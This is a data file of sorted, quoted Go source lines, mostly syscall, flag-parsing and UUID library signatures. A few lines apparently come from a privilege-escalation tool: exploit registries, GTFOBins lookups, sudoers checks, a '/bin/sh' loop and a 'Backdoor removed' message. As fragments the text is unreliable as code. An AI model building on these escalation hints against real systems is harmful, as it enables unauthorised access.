"flag.Lookup(""flagname"").NoOptDefVal = ""4321"""
"flag.NoOptDefVal = """
"flag.NoOptDefVal = ""true"""
"flagCompError{subCommand: finalCmd.Name(), flagName: flagName}"
"flagName := ""--"" "
"flagName := ""output"""
"flagName = ""-"" "
"flagName = fmt.Sprintf(""-%s, --%s"", flag.Shorthand, flag.Name)"
"flagName = fmt.Sprintf(""--%s"", flag.Name)"
"flagVal, ""name"", ""help message for flagname"")"
"flagVal, ""varname"", ""v"", ""help message"")"
"flagnames := strings.Split(group, "" "")"
"flags = append(flags, arg)"
"flags, STATX_BASIC_STATS, "
"flags.BoolP(""verbose"", ""v"", false, ""verbose output"")"
"flags.Int(""usefulflag"", 777, ""sometimes it's very useful"")"
"flags.MarkDeprecated(""badflag"", ""please use --good-flag instead"")"
"flags.MarkHidden(""secretFlag"")"
"flags.MarkShorthandDeprecated(""noshorthandflag"", ""please use --noshorthandflag only"")"
"flags.String(""coolflag"", ""yeaah"", ""it's really cool flag"")"
"flagsPtr, err := syscall.BytePtrFromString(flags)"
"flagval, ""varname"", ""v"", ""help message"")"
"flagvar, ""boolname"", ""b"", true, ""help message"")"
"flagvar, ""flagname"", 1234, ""help message for flagname"")"
"flistxattr(fd int, dest "
"flistxattr(int fd, char "
"float32, name string, value float32, usage string) {"
"float32, name, shorthand string, value float32, usage string) {"
"float32SliceValue) fromString(val string) (float32, error) {"
"float32Value, "
"float64, name string, value float64, usage string) {"
"float64, name, shorthand string, value float64, usage string) {"
"float64SliceValue) fromString(val string) (float64, error) {"
"flock(int fd, int how)"
"fmt.Fprint(c.ErrOrStderr(), i...)"
"fmt.Fprint(c.OutOrStderr(), i...)"
"fmt.Fprint(f.out(), usages)"
"fmt.Fprint(os.Stderr, msg)"
"fmt.Fprintf(f.out(), ""Flag --%s has been deprecated, %s"
"fmt.Fprintf(f.out(), ""Flag shorthand -%s has been deprecated, %s"
"fmt.Fprintf(f.out(), ""Usage of %s:"
"fmt.Fprintf(f.out(), msg)"
"fmt.Fprintf(finalCmd.ErrOrStderr(), ""Completion ended with directive: %s"
"fmt.Fprintf(finalCmd.OutOrStdout(), "":%d"
"fmt.Fprintf(os.Stderr, ""Usage of %s:"
"fmt.Fprintln(buf, line[:sidx], spacing, wrap(maxlen"
"fmt.Fprintln(f.out(), err)"
"fmt.Fprintln(f.out(), msg)"
"fmt.Fprintln(finalCmd.OutOrStdout(), comp)"
"fmt.Fprintln(os.Stderr, ""Error:"", msg)"
"fmt.Printf("""
"fmt.Printf(""%s satisfies constraints %s"", v1, constraints)"
"fmt.Printf(""conn addr=%v fd=%d"", sa.("
"fmt.Println("""
"fmt.Println("""")"
"fmt.Println(""Backdoor removed."")"
"fmt.Println(""Using config file:"", viper.ConfigFileUsed())"
"fmt.Println(""flagvar has value "", flagvar)"
"fmt.Println(""ip has value "", "
"fmt.Sprintf(""gtfobins:%s"", binaryName),"
"fmt.Sprintf(""http://localhost/build"
"fmtParts := make([]string, len(v.segments))"
"fn := ""/dev/pts/"" "
"fname, char "
"fname, fhandle_t "
"fname, int ops, int facs, int pid)"
"fname, int ops, int facs, pid_t pid)"
"fname, struct fhandle "
"fname, void "
"fobj, err := createFileObj(path, stat)"
"for _, a := range args {"
"for _, a := range c.Aliases {"
"for _, alias := range c.Aliases {"
"for _, argAlias := range finalCmd.ArgAliases {"
"for _, b := range list {"
"for _, b := range s {"
"for _, boolStr := range boolStrSlice {"
"for _, c := range cmd.Commands() {"
"for _, c := range cs {"
"for _, c := range d.Name {"
"for _, c := range name {"
"for _, candidate := range candidates {"
"for _, cmd := range c.commands {"
"for _, cmd := range cmds {"
"for _, command := range []string{""/bin/sh"", ""/usr/bin/true""} {"
"for _, command := range c.commands {"
"for _, comp := range completions {"
"for _, entry := range s {"
"for _, explicitSuggestion := range cmd.SuggestFor {"
"for _, exploit := range allExploits {"
"for _, fName := range strings.Split(flagList, "" "") {"
"for _, flag := range f.formal {"
"for _, flag := range flags {"
"for _, flagList := range keys {"
"for _, fname := range flagnames {"
"for _, g := range groups {"
"for _, goFlagSet := range f.addedGoFlagSets {"
"for _, group := range groupInfo {"
"for _, ifs := range interfaces {"
"for _, image := range images {"
"for _, input := range v.inputs {"
"for _, ipStr := range ipStrSlice {"
"for _, isSet := range flagnameAndStatus {"
"for _, line := range lines {"
"for _, line := range strings.Split(string(data), """
"for _, mod := range []string{""ptem"", ""ldterm"", ""ttcompat""} {"
"for _, name := range candidates {"
"for _, name := range flagnames {"
"for _, node := range nodes {"
"for _, nsid := range [...]int{EXTATTR_NAMESPACE_USER, EXTATTR_NAMESPACE_SYSTEM} {"
"for _, pFd := range pollfds {"
"for _, pair := range ss {"
"for _, parg := range pargs {"
"for _, platform := range []struct {"
"for _, ptr := range sections {"
"for _, r := range runes {"
"for _, r := range string(buffer[:n]) {"
"for _, registration := range registeredVulnerabilities {"
"for _, right := range clearrights {"
"for _, right := range setrights {"
"for _, s := range segs {"
"for _, s := range suggestions {"
"for _, sep := range from {"
"for _, signal := range signalList {"
"for _, skip := range skipExploits {"
"for _, str := range strings.Split(ver, ""."") {"
"for _, sub := range c.commands {"
"for _, subCmd := range cmd.Commands() {"
"for _, subCmd := range finalCmd.Commands() {"
"for _, v := range ("
"for _, v := range args {"
"for _, v := range cmd.ValidArgs {"
"for _, v := range flagNames {"
"for _, validArg := range finalCmd.ValidArgs {"
"for _, value := range cmd.Aliases {"
"for _, value := range cmd.ArgAliases {"
"for _, value := range cmd.ValidArgs {"
"for _, x := range initializers {"
"for _, y := range x.commands {"
"for attr, esc := range attrMap {"
"for command-line options][1]. For a more precise description, see the"
"for epEvt, pEvt := range ep2p {"
"for fd, epollevt := range ep.fds {"
"for flagList, flagnameAndStatus := range groupStatus {"
"for flagList, flagnameAndStatus := range mutuallyExclusiveGroupStatus {"
"for flagName, isSet := range flagnameAndStatus {"
"for flagname, isSet := range flagnameAndStatus {"
"for fname, flag := range f.formal {"
"for i, arg := range args {"
"for i, b := range "
"for i, b := range []byte(sa.Name[:]) {"
"for i, b := range []byte(sa.UserID[:]) {"
"for i, b := range bs {"
"for i, b := range rawSO {"
"for i, b := range uname.Version {"
"for i, c := range b[0:] {"
"for i, c := range buf {"
"for i, c := range cs {"
"for i, c := range n {"
"for i, c := range name {"
"for i, c := range ptm.Sn {"
"for i, con := range left {"
"for i, d := range "
"for i, d := range ss {"
"for i, d := range val {"
"for i, fd := range fds {"
"for i, ip := range "
"for i, j := 0, 0"
"for i, name := range list {"
"for i, raw := range versionsRaw {"
"for i, s := range v.segments {"
"for i, single := range vs {"
"for i, str := range segmentsStr {"
"for i, sval := range ss {"
"for i, t := range ss {"
"for i, v := range a[0:n] {"
"for i, v := range gids {"
"for i, v := range s {"
"for i, v := range v.segments {"
"for i, x := range [16]int{"
"for i, x := range cmds {"
"for i, y := range args {"
"for k, v := range "
"for k, v := range out {"
"for k, v := range tmplFuncs {"
"for key, value := range annotations {"
"for pEvt, epEvt := range p2ep {"
"for partno, part := range parts {"
"for s != """" {"
"force=1"", id), nil)"
"force=1"", name), nil)"
"format := ""    """
"format := ""    flags"
"format := ""    local_nonpersistent_flags"
"format := ""    must_have_one_flag"
"format = ""    two_word_flags"
"format, _ := Parse(input)"
"format, err := Parse(input)"
"fpathconf(int fd, int name)"
"frame := make([]byte, 16)"
"fremovexattr(fd int, attr string, options int) (err error)"
"fremovexattr(int fd, const char "
"freq, int64_t "
"from := []string{""-"", ""_""}"
"from the generated architecture-specific files listed below, and merge these"
"from, char "
"from, const char "
"from, err := UTF16PtrFromString(oldpath)"
"from, err = anyToSockaddr(0, "
"from, err = anyToSockaddr(fd, "
"from, err = rsa.Sockaddr()"
"from, int tofd, const char "
"from, socklen_t "
"fromlenaddr, struct sctp_sndrcvinfo "
"fsCount, err := W_Getmntent_A(("
"fs_count, err := W_Getmntent(("
"fsetxattr(fd int, attr string, data "
"fsetxattr(int fd, const char "
"fstat(fd int, st "
"fstat(fd int, stat "
"fstat(int fd, struct stat "
"fstat_freebsd12(fd int, stat "
"fstatat(dirfd int, path string, st "
"fstatat(dirfd int, path string, stat "
"fstatat(fd int, path string, stat "
"fstatat(int fd, const char "
"fstatat_freebsd12(fd int, path string, stat "
"fstatfs(fd int, stat "
"fstatfs_freebsd12(fd int, stat "
"fstatvfs1(int fd, struct statvfs "
"fsyncRange(fd int, how int, start int64, length int64) (err error) = fsync_range"
"fsync_range(int fd, int flags, off_t start, off_t length)"
"ft, _ := GetFileType(fd)"
"ftruncate(int fd, int PAD, off_t length)"
"func (c commandSorterByName) Less(i, j int) bool { return c[i].Name() < c[j].Name() }"
"func (c commandSorterByName) Swap(i, j int)      { c[i], c[j] = c[j], c[i] }"
"func (cs Constraints) Less(i, j int) bool {"
"func (cs Constraints) Swap(i, j int) {"
"func (deviceInfoSet DevInfo) CallClassInstaller(installFunction DI_FUNCTION, deviceInfoData "
"func (deviceInfoSet DevInfo) CreateDeviceInfo(deviceName string, classGUID "
"func (logger Logger) Printf(format string, args ...interface{}) {"
"func (nu NullUUID) MarshalBinary() ([]byte, error) {"
"func (nu NullUUID) MarshalJSON() ([]byte, error) {"
"func (nu NullUUID) MarshalText() ([]byte, error) {"
"func (nu NullUUID) Value() (driver.Value, error) {"
"func (r passwordReader) Read(buf []byte) (int, error) {"
"func (s Sudoers) GetEntryForBinary(binary string, hasPasswd bool) ("
"func (t Time) UnixTime() (sec, nsec int64) {"
"func (t Token) GetUserProfileDirectory() (string, error) {"
"func (t Token) IsRestricted() (isRestricted bool, err error) {"
"func (t Token) getInfo(class uint32, initSize int) (unsafe.Pointer, error) {"
"func (token Token) Environ(inheritExisting bool) (env []string, err error) {"
"func (token Token) GetLinkedToken() (Token, error) {"
"func (uuid UUID) MarshalBinary() ([]byte, error) {"
"func (uuid UUID) MarshalText() ([]byte, error) {"
"func (uuid UUID) Value() (driver.Value, error) {"
"func (v Collection) Less(i, j int) bool {"
"func (v Collection) Swap(i, j int) {"
"func ACLFromEntries(explicitEntries []EXPLICIT_ACCESS, mergedACL "
"func Accept(fd Handle) (nfd Handle, sa Sockaddr, err error) { return 0, nil, syscall.EWINDOWS }"
"func Accept(fd int) (nfd int, sa Sockaddr, err error) {"
"func Accept4(fd int, flags int) (nfd int, sa Sockaddr, err error) {"
"func Accept4(fd, flags int) (nfd int, sa Sockaddr, err error) {"
"func AcceptEx(ls Handle, as Handle, buf "
"func Access(path string, mode uint32) (err error) {"
"func AddKey(keyType string, description string, payload []byte, ringid int) (id int, err error) {"
"func AddTemplateFunc(name string, tmplFunc interface{}) {"
"func AdjustTokenGroups(token Token, resetToDefault bool, newstate "
"func AdjustTokenPrivileges(token Token, disableAllPrivileges bool, newstate "
"func Alarm(seconds uint) (remaining uint, err error) {"
"func AppendActiveHelp(compArray []string, activeHelpStr string) []string {"
"func AssignProcessToJobObject(job Handle, process Handle) (err error) {"
"func Bind(fd Handle, sa Sockaddr) (err error) {"
"func Bind(fd int, sa Sockaddr) (err error) {"
"func Bind(name string, old string, flag int) (err error) {"
"func BindToDevice(fd int, device string) (err error) {"
"func Bool(name string, value bool, usage string) "
"func BoolP(name, shorthand string, value bool, usage string) "
"func BoolSlice(name string, value []bool, usage string) "
"func BoolSliceP(name, shorthand string, value []bool, usage string) "
"func ByteSliceFromString(s string) ([]byte, error) {"
"func BytesBase64(name string, value []byte, usage string) "
"func BytesBase64P(name, shorthand string, value []byte, usage string) "
"func BytesHex(name string, value []byte, usage string) "
"func BytesHexP(name, shorthand string, value []byte, usage string) "
"func CM_Get_Device_Interface_List(deviceID string, interfaceClass "
"func CancelIoEx(s Handle, o "
"func CapRightsLimit(fd uintptr, rights "
"func CertAddCertificateContextToStore(store Handle, certContext "
"func CertCloseStore(store Handle, flags uint32) (err error) {"
"func CertCreateCertificateContext(certEncodingType uint32, certEncoded "
"func CertEnumCertificatesInStore(store Handle, prevContext "
"func CertFindCertificateInStore(store Handle, certEncodingType uint32, findFlags uint32, findType uint32, findPara unsafe.Pointer, prevCertContext "
"func CertFindChainInStore(store Handle, certEncodingType uint32, findFlags uint32, findType uint32, findPara unsafe.Pointer, prevChainContext "
"func CertGetCertificateChain(engine Handle, leaf "
"func CertOpenStore(storeProvider uintptr, msgAndCertEncodingType uint32, cryptProv uintptr, flags uint32, para uintptr) (handle Handle, err error) {"
"func CertOpenSystemStore(hprov Handle, name "
"func CertVerifyCertificateChainPolicy(policyOID uintptr, chain "
"func ChangeServiceConfig(service Handle, serviceType uint32, startType uint32, errorControl uint32, binaryPathName "
"func ChangeServiceConfig2(service Handle, infoLevel uint32, info "
"func Chflags(path string, flags int) (err error) {"
"func Chmod(path string, mode uint32) (err error) {"
"func Chown(path string, uid int, gid int) (err error)  { return syscall.EWINDOWS }"
"func Chown(path string, uid int, gid int) (err error) {"
"func ClockGetres(clockid int32, res "
"func ClockGettime(clockid int32, time "
"func ClockGettime(clockid int32, ts "
"func ClockNanosleep(clockid int32, flags int, request "
"func Clonefile(src string, dst string, flags int) (err error) {"
"func Clonefileat(srcDirfd int, src string, dstDirfd int, dst string, flags int) (err error) {"
"func CloseOnExec(fd int) { fcntl(fd, F_SETFD, FD_CLOEXEC) }"
"func CloseRange(first uint, last uint, flags uint) (err error) {"
"func CoInitializeEx(reserved uintptr, coInit uint32) (ret error) {"
"func CompDebug(msg string, printToStdErr bool) {"
"func CompDebugln(msg string, printToStdErr bool) {"
"func ComputerName() (name string, err error) {"
"func Connect(fd Handle, sa Sockaddr) (err error) {"
"func Connect(fd int, sa Sockaddr) (err error) {"
"func ConnectEx(fd Handle, sa Sockaddr, sendBuf "
"func ConnectNamedPipe(pipe Handle, overlapped "
"func ControlService(service Handle, control uint32, status "
"func CopyFileRange(rfd int, roff "
"func CopySid(destSidLen uint32, destSid "
"func Count(name string, usage string) "
"func CountP(name, shorthand string, usage string) "
"func Creat(path string, mode uint32) (fd int, err error) {"
"func Create(path string, mode int, perm uint32) (fd int, err error) {"
"func CreateFileMapping(fhandle Handle, sa "
"func CreateIoCompletionPort(filehandle Handle, cphandle Handle, key uintptr, threadcnt uint32) (handle Handle, err error) {"
"func CreateProcessAsUser(token Token, appName "
"func CreateService(mgr Handle, serviceName "
"func CreateToolhelp32Snapshot(flags uint32, processId uint32) (handle Handle, err error) {"
"func CreateWellKnownDomainSid(sidType WELL_KNOWN_SID_TYPE, domainSid "
"func CryptDecodeObject(encodingType uint32, structType "
"func CryptGenRandom(provhandle Handle, buflen uint32, buf "
"func CryptQueryObject(objectType uint32, object unsafe.Pointer, expectedContentTypeFlags uint32, expectedFormatTypeFlags uint32, flags uint32, msgAndCertEncodingType "
"func CryptReleaseContext(provhandle Handle, flags uint32) (err error) {"
"func DecomposeCommandLine(commandLine string) ([]string, error) {"
"func DefineDosDevice(flags uint32, deviceName "
"func DeleteModule(name string, flags int) (err error) {"
"func DeviceIoControl(handle Handle, ioControlCode uint32, inBuffer "
"func DnsQuery(name string, qtype uint16, options uint32, extra "
"func Dup(fd int) (nfd int, err error) {"
"func Dup(oldfd int) (fd int, err error) {"
"func Dup(oldfd int, newfd int) (fd int, err error) {"
"func Dup2(from int, to int) (err error) {"
"func Dup2(oldfd int, newfd int) (err error) {"
"func Dup2(oldfd, newfd int) error {"
"func Dup3(from int, to int, flags int) (err error) {"
"func Dup3(oldfd int, newfd int, flags int) (err error) {"
"func DuplicateHandle(hSourceProcessHandle Handle, hSourceHandle Handle, hTargetProcessHandle Handle, lpTargetHandle "
"func DuplicateTokenEx(existingToken Token, desiredAccess uint32, tokenAttributes "
"func Duration(name string, value time.Duration, usage string) "
"func DurationP(name, shorthand string, value time.Duration, usage string) "
"func DurationSlice(name string, value []time.Duration, usage string) "
"func DurationSliceP(name, shorthand string, value []time.Duration, usage string) "
"func EnumProcessModules(process Handle, module "
"func EnumProcessModulesEx(process Handle, module "
"func EnumProcesses(processIds []uint32, bytesReturned "
"func EnumServicesStatusEx(mgr Handle, infoLevel uint32, serviceType uint32, serviceState uint32, services "
"func EpollCreate(size int) (fd int, err error) {"
"func EpollCreate1(flag int) (fd int, err error) {"
"func EpollCtl(epfd int, op int, fd int, event "
"func EpollWait(epfd int, events []EpollEvent, msec int) (n int, err error) {"
"func Eq(a interface{}, b interface{}) bool {"
"func Eventfd(initval uint, flags int) (fd int, err error) {"
"func Exchangedata(path1 string, path2 string, options int) (err error) {"
"func Exec(argv0 string, argv []string, envv []string) error {"
"func ExitWindowsEx(flags uint32, reason uint32) (err error) {"
"func ExtattrDeleteFd(fd int, attrnamespace int, attrname string) (err error) {"
"func ExtattrDeleteFile(file string, attrnamespace int, attrname string) (err error) {"
"func ExtattrDeleteLink(link string, attrnamespace int, attrname string) (err error) {"
"func ExtattrGetFd(fd int, attrnamespace int, attrname string, data uintptr, nbytes int) (ret int, err error) {"
"func ExtattrGetFile(file string, attrnamespace int, attrname string, data uintptr, nbytes int) (ret int, err error) {"
"func ExtattrGetLink(link string, attrnamespace int, attrname string, data uintptr, nbytes int) (ret int, err error) {"
"func ExtattrListFd(fd int, attrnamespace int, data uintptr, nbytes int) (ret int, err error) {"
"func ExtattrListFile(file string, attrnamespace int, data uintptr, nbytes int) (ret int, err error) {"
"func ExtattrListLink(link string, attrnamespace int, data uintptr, nbytes int) (ret int, err error) {"
"func ExtattrSetFd(fd int, attrnamespace int, attrname string, data uintptr, nbytes int) (ret int, err error) {"
"func ExtattrSetFile(file string, attrnamespace int, attrname string, data uintptr, nbytes int) (ret int, err error) {"
"func ExtattrSetLink(link string, attrnamespace int, attrname string, data uintptr, nbytes int) (ret int, err error) {"
"func Faccessat(dirfd int, path string, mode uint32, flags int) (err error) {"
"func Faccessat2(dirfd int, path string, mode uint32, flags int) (err error) {"
"func Fadvise(fd int, offset int64, length int64, advice int) (err error) {"
"func Fallocate(fd int, mode uint32, off int64, len int64) (err error) {"
"func FanotifyInit(flags uint, event_f_flags uint) (fd int, err error) {"
"func FanotifyMark(fd int, flags uint, mask uint64, dirFd int, pathname string) (err error) {"
"func Fchflags(fd int, flags int) (err error) {"
"func Fchmod(fd Handle, mode uint32) (err error)        { return syscall.EWINDOWS }"
"func Fchmod(fd int, mode uint32) (err error) {"
"func Fchmodat(dirfd int, path string, mode uint32, flags int) (err error) {"
"func Fchown(fd Handle, uid int, gid int) (err error)   { return syscall.EWINDOWS }"
"func Fchown(fd int, uid int, gid int) (err error) {"
"func Fchownat(dirfd int, path string, uid int, gid int, flags int) (err error) {"
"func Fclonefileat(srcDirfd int, dstDirfd int, dst string, flags int) (err error) {"
"func FcntlFlock(fd uintptr, cmd int, lk "
"func FcntlFstore(fd uintptr, cmd int, fstore "
"func FcntlInt(fd uintptr, cmd int, arg int) (r int, err error) {"
"func FcntlInt(fd uintptr, cmd int, arg int) (retval int, err error) {"
"func FcntlInt(fd uintptr, cmd, arg int) (int, error) {"
"func Fd2path(fd int) (path string, err error) {"
"func Fgetxattr(fd int, attr string, dest []byte) (sz int, err error) {"
"func FindFirstChangeNotification(path string, watchSubtree bool, notifyFilter uint32) (handle Handle, err error) {"
"func FindNextFile(handle Handle, data "
"func FindNextVolume(findVolume Handle, volumeName "
"func FindNextVolumeMountPoint(findVolumeMountPoint Handle, volumeMountPoint "
"func FindResource(module Handle, name, resType ResourceIDOrString) (Handle, error) {"
"func FinitModule(fd int, params string, flags int) (err error) {"
"func FixedCompletions(choices []string, directive ShellCompDirective) func(cmd "
"func Flistxattr(fd int, dest []byte) (sz int, err error) {"
"func Float32(name string, value float32, usage string) "
"func Float32P(name, shorthand string, value float32, usage string) "
"func Float32Slice(name string, value []float32, usage string) "
"func Float32SliceP(name, shorthand string, value []float32, usage string) "
"func Float64(name string, value float64, usage string) "
"func Float64P(name, shorthand string, value float64, usage string) "
"func Float64Slice(name string, value []float64, usage string) "
"func Float64SliceP(name, shorthand string, value []float64, usage string) "
"func Flock(fd int, how int) (err error) {"
"func Flock(fd int, how int) error {"
"func FlushViewOfFile(addr uintptr, length uintptr) (err error) {"
"func FormatMessage(flags uint32, msgsrc uintptr, msgid uint32, langid uint32, buf []uint16, args "
"func Fpathconf(fd int, name int) (val int, err error) {"
"func Fprintf(w io.Writer, input string, a ...interface{}) error {"
"func Fprintln(w io.Writer, input string) {"
"func Fremovexattr(fd int, attr string) (err error) {"
"func FromBytes(b []byte) (uuid UUID, err error) {"
"func Fsetxattr(fd int, attr string, data []byte, flags int) (err error) {"
"func Fsetxattr(fd int, attr string, dest []byte, flags int) (err error) {"
"func Fsmount(fd int, flags int, mountAttrs int) (fsfd int, err error) {"
"func Fsopen(fsName string, flags int) (fd int, err error) {"
"func Fspick(dirfd int, pathName string, flags int) (fd int, err error) {"
"func Fstat(fd int, edir []byte) (n int, err error) {"
"func Fstat(fd int, s "
"func Fstat(fd int, st "
"func Fstat(fd int, stat "
"func Fstatat(dirfd int, path string, s "
"func Fstatat(dirfd int, path string, stat "
"func Fstatat(fd int, path string, st "
"func Fstatat(fd int, path string, stat "
"func Fstatfs(fd int, buf "
"func Fstatfs(fd int, st "
"func Fstatfs(fd int, stat "
"func Fstatvfs(fd int, buf "
"func Fstatvfs(fd int, stat "
"func Fstatvfs(fd int, vfsstat "
"func Fstatvfs1(fd int, buf "
"func Ftruncate(fd Handle, length int64) (err error) {"
"func Ftruncate(fd int, length int64) (err error) {"
"func FullPath(name string) (path string, err error) {"
"func Futimes(fd int, tv []Timeval) (err error) {"
"func Futimes(fd int, tv []Timeval) error {"
"func Futimesat(dirfd int, path string, tv []Timeval) error {"
"func Fwstat(fd int, edir []byte) (err error) {"
"func GUIDFromString(str string) (GUID, error) {"
"func GenerateConsoleCtrlEvent(ctrlEvent uint32, processGroupID uint32) (err error) {"
"func GenerateGUID() (GUID, error) {"
"func GetAdaptersAddresses(family uint32, flags uint32, reserved uintptr, adapterAddresses "
"func GetCommTimeouts(handle Handle, timeouts "
"func GetComputerNameEx(nametype uint32, buf "
"func GetConsoleMode(console Handle, mode "
"func GetConsoleScreenBufferInfo(console Handle, info "
"func GetCurrentDirectory(buflen uint32, buf "
"func GetCurrentProcess() (Handle, error) {"
"func GetCurrentThread() (Handle, error) {"
"func GetExitCodeProcess(handle Handle, exitcode "
"func GetFileInformationByHandle(handle Handle, data "
"func GetFileInformationByHandleEx(handle Handle, class uint32, outBuffer "
"func GetFileType(filehandle Handle) (n uint32, err error) {"
"func GetFileVersionInfo(filename string, handle uint32, bufSize uint32, buffer unsafe.Pointer) (err error) {"
"func GetFileVersionInfoSize(filename string, zeroHandle "
"func GetFinalPathNameByHandle(file Handle, filePath "
"func GetLogicalDriveStrings(bufferLength uint32, buffer "
"func GetLogicalDrives() (drivesBitMask uint32, err error) {"
"func GetModuleBaseName(process Handle, module Handle, baseName "
"func GetModuleFileName(module Handle, filename "
"func GetModuleFileNameEx(process Handle, module Handle, filename "
"func GetModuleHandleEx(flags uint32, moduleName "
"func GetModuleInformation(process Handle, module Handle, modinfo "
"func GetNamedPipeHandleState(pipe Handle, state "
"func GetNamedPipeInfo(pipe Handle, flags "
"func GetNamedSecurityInfo(objectName string, objectType SE_OBJECT_TYPE, securityInformation SECURITY_INFORMATION) (sd "
"func GetOverlappedResult(handle Handle, overlapped "
"func GetPriorityClass(process Handle) (ret uint32, err error) {"
"func GetProcAddress(module Handle, procname string) (proc uintptr, err error) {"
"func GetProcAddressByOrdinal(module Handle, ordinal uintptr) (proc uintptr, err error) {"
"func GetProcessId(process Handle) (id uint32, err error) {"
"func GetProcessPreferredUILanguages(flags uint32) ([]string, error) {"
"func GetProcessTimes(handle Handle, creationTime "
"func GetProcessWorkingSetSizeEx(hProcess Handle, lpMinimumWorkingSetSize "
"func GetQueuedCompletionStatus(cphandle Handle, qty "
"func GetSecurityInfo(handle Handle, objectType SE_OBJECT_TYPE, securityInformation SECURITY_INFORMATION) (sd "
"func GetServByName(name string, proto string) (s "
"func GetSize(fd int) (width, height int, err error) {"
"func GetStdHandle(stdhandle uint32) (handle Handle, err error) {"
"func GetSystemDirectory() (string, error) {"
"func GetSystemPreferredUILanguages(flags uint32) ([]string, error) {"
"func GetSystemWindowsDirectory() (string, error) {"
"func GetTempPath(buflen uint32, buf "
"func GetThreadPreferredUILanguages(flags uint32) ([]string, error) {"
"func GetTime() (Time, uint16, error) {"
"func GetTokenInformation(token Token, infoClass uint32, info "
"func GetUserNameEx(nameFormat uint32, nameBuffre "
"func GetUserPreferredUILanguages(flags uint32) ([]string, error) {"
"func GetUserProfileDirectory(t Token, dir "
"func GetVersion() (ver uint32, err error) {"
"func GetVolumeInformationByHandle(file Handle, volumeNameBuffer "
"func GetWindowThreadProcessId(hwnd HWND, pid "
"func GetWindowsDirectory() (string, error) {"
"func Getcwd(buf []byte) (n int, err error) {"
"func Getdents(fd int, buf []byte) (n int, err error) {"
"func Getdents(fd int, buf []byte, basep "
"func Getdirentries(fd int, buf []byte, basep "
"func Getenv(key string) (value string, found bool) {"
"func Getfsstat(buf []Statfs_t, flags int) (n int, err error) {"
"func Getgroups() (gids []int, err error) { return nil, syscall.EWINDOWS }"
"func Getgroups() (gids []int, err error) {"
"func Gethostname() (name string, err error) {"
"func Getitimer(which ItimerWhich) (Itimerval, error) {"
"func Getmsg(fd int, cl []byte, data []byte) (retCl []byte, retData []byte, flags int, err error) {"
"func Getpeername(fd Handle) (sa Sockaddr, err error) {"
"func Getpeername(fd int) (sa Sockaddr, err error) {"
"func Getpgid(pid int) (pgid int, err error) {"
"func Getpgrp() (pgid int, err error) {"
"func Getpriority(which int, who int) (n int, err error) {"
"func Getpriority(which int, who int) (prio int, err error) {"
"func Getrandom(buf []byte, flags int) (n int, err error) {"
"func Getrlimit(resource int, rlim "
"func Getrlimit(which int, lim "
"func Getrtable() (rtable int, err error) {"
"func Getrusage(who int, rusage "
"func Getsid(pid int) (sid int, err error) {"
"func Getsockname(fd Handle) (sa Sockaddr, err error) {"
"func Getsockname(fd int) (sa Sockaddr, err error) {"
"func Getsockopt(s Handle, level int32, optname int32, optval "
"func GetsockoptByte(fd, level, opt int) (value byte, err error) {"
"func GetsockoptICMPv6Filter(fd, level, opt int) ("
"func GetsockoptIPMreq(fd, level, opt int) ("
"func GetsockoptIPMreqn(fd, level, opt int) ("
"func GetsockoptIPv6MTUInfo(fd, level, opt int) ("
"func GetsockoptIPv6Mreq(fd, level, opt int) ("
"func GetsockoptInet4Addr(fd, level, opt int) (value [4]byte, err error) {"
"func GetsockoptInt(fd Handle, level, opt int) (int, error) {"
"func GetsockoptInt(fd, level, opt int) (value int, err error) {"
"func GetsockoptLinger(fd, level, opt int) ("
"func GetsockoptString(fd, level, opt int) (string, error) {"
"func GetsockoptTCPConnectionInfo(fd, level, opt int) ("
"func GetsockoptTCPInfo(fd, level, opt int) ("
"func GetsockoptTimeval(fd, level, opt int) ("
"func GetsockoptTpacketStats(fd, level, opt int) ("
"func GetsockoptTpacketStatsV3(fd, level, opt int) ("
"func GetsockoptUcred(fd, level, opt int) ("
"func GetsockoptUint64(fd, level, opt int) (value uint64, err error) {"
"func GetsockoptXucred(fd, level, opt int) ("
"func Getwd() (ret string, err error) {"
"func Getwd() (string, error) {"
"func Getwd() (wd string, err error) {"
"func Getxattr(file string, attr string, dest []byte) (sz int, err error) {"
"func Getxattr(path string, attr string, dest []byte) (sz int, err error) {"
"func Gt(a interface{}, b interface{}) bool {"
"func IP(name string, value net.IP, usage string) "
"func IPMask(name string, value net.IPMask, usage string) "
"func IPMaskP(name, shorthand string, value net.IPMask, usage string) "
"func IPNet(name string, value net.IPNet, usage string) "
"func IPNetP(name, shorthand string, value net.IPNet, usage string) "
"func IPP(name, shorthand string, value net.IP, usage string) "
"func IPSlice(name string, value []net.IP, usage string) "
"func IPSliceP(name, shorthand string, value []net.IP, usage string) "
"func InheritSize(pty, tty "
"func InitModule(moduleImage []byte, params string) (err error) {"
"func InotifyAddWatch(fd int, pathname string, mask uint32) (watchdesc int, err error) {"
"func InotifyInit() (fd int, err error) {"
"func InotifyInit1(flags int) (fd int, err error) {"
"func InotifyRmWatch(fd int, watchdesc uint32) (success int, err error) {"
"func Int(name string, value int, usage string) "
"func Int16(name string, value int16, usage string) "
"func Int16P(name, shorthand string, value int16, usage string) "
"func Int32(name string, value int32, usage string) "
"func Int32P(name, shorthand string, value int32, usage string) "
"func Int32Slice(name string, value []int32, usage string) "
"func Int32SliceP(name, shorthand string, value []int32, usage string) "
"func Int64(name string, value int64, usage string) "
"func Int64P(name, shorthand string, value int64, usage string) "
"func Int64Slice(name string, value []int64, usage string) "
"func Int64SliceP(name, shorthand string, value []int64, usage string) "
"func Int8(name string, value int8, usage string) "
"func Int8P(name, shorthand string, value int8, usage string) "
"func IntP(name, shorthand string, value int, usage string) "
"func IntSlice(name string, value []int, usage string) "
"func IntSliceP(name, shorthand string, value []int, usage string) "
"func IoctlCtlInfo(fd int, ctlInfo "
"func IoctlFileClone(destFd, srcFd int) error {"
"func IoctlFileCloneRange(destFd int, value "
"func IoctlFileDedupeRange(srcFd int, value "
"func IoctlGetEthtoolDrvinfo(fd int, ifname string) ("
"func IoctlGetIfreqMTU(fd int, ifname string) ("
"func IoctlGetInt(fd int, req uint) (int, error) {"
"func IoctlGetPtmget(fd int, req uint) ("
"func IoctlGetTermio(fd int, req uint) ("
"func IoctlGetTermios(fd int, req uint) ("
"func IoctlGetUint32(fd int, req uint) (uint32, error) {"
"func IoctlGetWinsize(fd int, req uint) ("
"func IoctlHIDGetDesc(fd int, value "
"func IoctlHIDGetRawName(fd int) (string, error) {"
"func IoctlHIDGetRawPhys(fd int) (string, error) {"
"func IoctlHIDGetRawUniq(fd int) (string, error) {"
"func IoctlIfreq(fd int, req uint, value "
"func IoctlKCMAttach(fd int, info KCMAttach) error {"
